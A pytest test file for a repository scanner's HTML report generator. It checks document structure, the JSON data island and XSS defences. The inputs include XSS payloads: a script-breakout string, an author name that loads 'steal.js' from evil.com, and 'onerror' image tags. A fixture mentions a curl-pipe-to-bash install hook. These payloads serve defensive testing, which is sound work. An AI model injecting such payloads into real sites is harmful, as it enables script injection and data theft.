"""
Tests for gitsin.html_report and ExportManager.export_html.

Validates the HTML report generator for:
  - Structural correctness (DOCTYPE, CSP, data island)
  - XSS prevention (script breakout escaping, no innerHTML)
  - Content integrity (data round-trips through JSON embedding)
"""

import json
import re
import pytest
from datetime import datetime, timezone

from gitsin.models import (
    RiskLedger, BlameRecord, CommitActor, SinEvent, ThreatIndicator,
)
from gitsin.exporter import ExportManager
from gitsin.html_report import render


# ── Fixture ───────────────────────────────────────────────

@pytest.fixture
def empty_ledger():
    return RiskLedger(
        repository_name="test-repo",
        scan_timestamp=datetime(2024, 6, 14, 12, 0, 0, tzinfo=timezone.utc),
        deterministic_risk_score=0,
        total_exposure_usd=0,
        violations=[],
        threat_indicators=[],
        telemetry_activity=[],
    )


@pytest.fixture
def populated_ledger():
    actor = CommitActor(
        name="Test Author",
        email="test@example.com",
        timestamp=datetime(2024, 6, 1, tzinfo=timezone.utc),
    )
    sin = SinEvent(
        rule_id="aws-access-token",
        description="AWS access key",
        file_path="config/.env",
        line_number=42,
    )
    record = BlameRecord(commit_hash="a" * 40, actor=actor, sin=sin)
    indicator = ThreatIndicator(
        rule_id="GITSIN_THREAT_001",
        name="Suspicious npm preinstall hook",
        category="malicious_install_hook",
        description="curl pipe to bash in preinstall",
        file_path="package.json",
        severity="CRITICAL",
        confidence="high",
    )
    return RiskLedger(
        repository_name="vuln-repo",
        scan_timestamp=datetime(2024, 6, 14, 12, 0, 0, tzinfo=timezone.utc),
        deterministic_risk_score=75,
        total_exposure_usd=250000,
        violations=[record],
        threat_indicators=[indicator],
        compliance_frameworks=["SOC2 CC6.1", "SLSA Level 3"],
        telemetry_activity=["clone: initial clone from origin"],
    )


# ── Structural tests ─────────────────────────────────────

class TestHtmlStructure:
    def test_returns_string(self, empty_ledger):
        result = render(empty_ledger)
        assert isinstance(result, str)

    def test_starts_with_doctype(self, empty_ledger):
        result = render(empty_ledger)
        assert result.strip().startswith("<!DOCTYPE html>")

    def test_contains_csp_header(self, empty_ledger):
        result = render(empty_ledger)
        assert "Content-Security-Policy" in result
        assert "default-src 'none'" in result

    def test_contains_json_data_island(self, empty_ledger):
        result = render(empty_ledger)
        assert '<script type="application/json" id="report-data">' in result

    def test_data_island_contains_valid_json(self, empty_ledger):
        result = render(empty_ledger)
        # Extract the JSON from the data island.
        match = re.search(
            r'<script type="application/json" id="report-data">(.*?)</script>',
            result, re.DOTALL,
        )
        assert match, "Data island not found"
        # Unescape the <\/ sequences for JSON parsing.
        raw_json = match.group(1).replace("<\\/", "</")
        data = json.loads(raw_json)
        assert data["repository_name"] == "test-repo"
        assert data["deterministic_risk_score"] == 0

    def test_populated_data_round_trips(self, populated_ledger):
        result = render(populated_ledger)
        match = re.search(
            r'<script type="application/json" id="report-data">(.*?)</script>',
            result, re.DOTALL,
        )
        raw_json = match.group(1).replace("<\\/", "</")
        data = json.loads(raw_json)
        assert data["repository_name"] == "vuln-repo"
        assert data["deterministic_risk_score"] == 75
        assert len(data["violations"]) == 1
        assert len(data["threat_indicators"]) == 1

    def test_export_manager_html_method(self, populated_ledger):
        result = ExportManager.export_html(populated_ledger)
        assert "<!DOCTYPE html>" in result
        assert "vuln-repo" in result


# ── XSS prevention tests ─────────────────────────────────

class TestXssPrevention:
    def test_script_tag_in_repo_name_escaped(self):
        """A repo name containing </script> must not break the data island."""
        ledger = RiskLedger(
            repository_name='</script><script>alert(1)</script>',
            scan_timestamp=datetime(2024, 1, 1, tzinfo=timezone.utc),
            deterministic_risk_score=0,
            total_exposure_usd=0,
            violations=[],
            threat_indicators=[],
            telemetry_activity=[],
        )
        result = render(ledger)
        # The literal </script> must NOT appear unescaped in the output.
        # It should be escaped as <\/script>.
        data_island_end = result.find('</script>')
        data_island_start = result.find('<script type="application/json"')
        # The first </script> should close the data island, not be
        # injected from the repo name.
        assert data_island_start < data_island_end
        # Verify the repo name is escaped in the JSON.
        assert '<\\/script>' in result

    def test_script_tag_in_author_name_escaped(self):
        """Author names like <script src="evil.com"> must not execute."""
        actor = CommitActor(
            name='<script src="http://evil.com/steal.js"></script>',
            email="attacker@evil.com",
            timestamp=datetime(2024, 1, 1, tzinfo=timezone.utc),
        )
        sin = SinEvent(rule_id="test", description="test", file_path="test", line_number=1)
        record = BlameRecord(commit_hash="b" * 40, actor=actor, sin=sin)
        ledger = RiskLedger(
            repository_name="test",
            scan_timestamp=datetime(2024, 1, 1, tzinfo=timezone.utc),
            deterministic_risk_score=50,
            total_exposure_usd=0,
            violations=[record],
            threat_indicators=[],
            telemetry_activity=[],
        )
        result = render(ledger)
        # The injected script tag must be inside the JSON (escaped),
        # not as raw HTML.
        assert '<\\/script>' in result
        # The rendering JS uses textContent, so even if the JSON is
        # parsed correctly, the script won't execute.  But verify the
        # JSON data island is not broken.
        match = re.search(
            r'<script type="application/json" id="report-data">(.*?)</script>',
            result, re.DOTALL,
        )
        assert match, "Data island was broken by injected script tag"

    def test_html_in_file_path_escaped(self):
        """File paths like <img onerror=alert(1)> must not inject HTML."""
        indicator = ThreatIndicator(
            rule_id="TEST",
            name='<img src=x onerror=alert(1)>',
            category="test",
            description="test",
            file_path='<img src=x onerror=alert(1)>.js',
            severity="CRITICAL",
            confidence="high",
        )
        ledger = RiskLedger(
            repository_name="test",
            scan_timestamp=datetime(2024, 1, 1, tzinfo=timezone.utc),
            deterministic_risk_score=40,
            total_exposure_usd=0,
            violations=[],
            threat_indicators=[indicator],
            telemetry_activity=[],
        )
        result = render(ledger)
        # The img tag must be inside JSON (escaped), not as raw HTML.
        # Verify no raw <img> tags exist outside the JSON data island.
        # Remove the data island to check the rest.
        without_data = re.sub(
            r'<script type="application/json".*?</script>',
            '', result, flags=re.DOTALL,
        )
        assert '<img' not in without_data

    def test_no_innerhtml_in_rendering_js(self):
        """The rendering JS must never use innerHTML with untrusted data."""
        result = render(RiskLedger(
            repository_name="test",
            scan_timestamp=datetime(2024, 1, 1, tzinfo=timezone.utc),
            deterministic_risk_score=0,
            total_exposure_usd=0,
            violations=[],
            threat_indicators=[],
            telemetry_activity=[],
        ))
        # Extract the JS block.
        js_blocks = re.findall(
            r'<script>(.*?)</script>',
            result, re.DOTALL,
        )
        for js in js_blocks:
            assert 'innerHTML' not in js, (
                "innerHTML found in rendering JS — XSS risk"
            )


# ── Content tests ─────────────────────────────────────────

class TestHtmlContent:
    def test_contains_repository_name(self, populated_ledger):
        result = render(populated_ledger)
        # The repo name will be in the JSON data island.
        assert "vuln-repo" in result

    def test_contains_risk_score_in_json(self, populated_ledger):
        result = render(populated_ledger)
        match = re.search(
            r'<script type="application/json" id="report-data">(.*?)</script>',
            result, re.DOTALL,
        )
        data = json.loads(match.group(1).replace("<\\/", "</"))
        assert data["deterministic_risk_score"] == 75

    def test_contains_no_data_transmitted_notice(self, empty_ledger):
        result = render(empty_ledger)
        assert "No data was transmitted" in result

    def test_contains_gauge_rendering_js(self, empty_ledger):
        result = render(empty_ledger)
        assert "drawGauge" in result

    def test_contains_textcontent_in_js(self, empty_ledger):
        """Verify the JS uses textContent for safe rendering."""
        result = render(empty_ledger)
        assert "textContent" in result

    def test_contains_financial_exposure_context(self, populated_ledger):
        """Verify the $250,000 exposure has the IBM Cost of a Data Breach context."""
        result = render(populated_ledger)
        assert "IBM Cost of a Data Breach Report" in result

    def test_contains_compliance_frameworks(self, populated_ledger):
        """Verify aggregated frameworks are rendered."""
        result = render(populated_ledger)
        assert "AT-RISK COMPLIANCE FRAMEWORKS" in result
        assert "SOC2 CC6.1" in result
        assert "SLSA Level 3" in result

    def test_contains_business_impact_lookup(self, empty_ledger):
        """Verify the static business impact lookup maps are in the JS."""
        result = render(empty_ledger)
        assert "IMPACT_BY_RULE" in result
        assert "IMPACT_BY_CATEGORY" in result
        assert "Exposes cloud infrastructure" in result
